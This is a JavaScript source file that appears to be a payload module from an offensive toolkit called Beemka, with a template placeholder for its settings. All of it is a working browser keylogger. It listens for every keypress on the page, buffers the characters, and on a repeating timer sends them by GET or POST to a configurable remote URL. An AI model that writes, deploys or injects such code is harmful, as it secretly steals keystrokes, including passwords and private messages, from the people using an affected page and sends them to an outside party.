if (typeof Beemka_Keylogger === 'undefined') {

    %BEEMKA_VARIABLE_PLACEHOLDER%

    let options = {
        keylogger: {
            url: beemka_keylogger_url,
            interval: beemka_keylogger_interval,
            param: beemka_keylogger_param,
            method: beemka_keylogger_method
        }
    };

    let Beemka_Keylogger = {
        keylogger: {
            interval: options.keylogger.interval,
            url: options.keylogger.url,
            param: options.keylogger.param,
            method: options.keylogger.method,
            data: []
        },

        init: function() {
            this.cleanParams();
            this.enableKeylogger();
            this.startKeyloggerInterval();
        },

        enableKeylogger: function() {
            document.body.addEventListener('keypress', function (e) {
                Beemka_Keylogger.log(String.fromCharCode(e.keyCode));
            });
        },

        log: function(c) {
            this.keylogger.data.push(c);
        },

        startKeyloggerInterval: function() {
            this.keyloggerSendData();

            setTimeout(function() {
                Beemka_Keylogger.startKeyloggerInterval();
            }, this.keylogger.interval);
        },

        cleanParams: function() {
            this.keylogger.interval = parseInt(this.keylogger.interval);
            this.keylogger.method = (this.keylogger.method.toLowerCase() == 'post') ? 'POST' : 'GET';
        },

        keyloggerSendData: function() {
            if (this.keylogger.data.length == 0) {
                return true;
            }

            let txt = this.keylogger.data.join('');
            this.keylogger.data = [];

            let xhttp = new XMLHttpRequest();
            if (this.keylogger.method == 'GET') {
                xhttp.open("GET", this.keylogger.url + '?' + this.keylogger.param + '=' + encodeURIComponent(txt), true);
                xhttp.send();
            } else {
                xhttp.open('POST', this.keylogger.url, true);
                xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xhttp.send(this.keylogger.param + "=" + encodeURIComponent(txt));
            }
        }
    };

    Beemka_Keylogger.init();
}